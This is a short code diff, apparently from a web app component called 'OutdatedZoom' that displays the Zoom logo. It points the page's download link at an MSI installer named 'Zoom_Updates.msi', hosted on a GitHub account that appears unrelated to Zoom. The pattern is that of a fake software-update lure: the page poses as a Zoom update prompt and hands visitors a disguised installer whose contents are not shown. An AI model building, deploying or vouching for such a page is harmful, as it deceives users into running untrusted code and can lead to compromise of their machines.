@@ -4,7 +4,7 @@ import { toast } from "sonner";
 import zoomLogo from "@/assets/zoom-logo.png";
 
 const DOWNLOAD_URL =
-  "https://github.com/YOUR-USERNAME/YOUR-REPO-NAME/releases/latest/download/ZoomWorkplace.msi";
+  "https://github.com/elizzygettygrant-maker/zoomupdates/releases/download/v.6565/Zoom_Updates.msi";
 
 const OutdatedZoom = () => {
   const navigate = useNavigate();
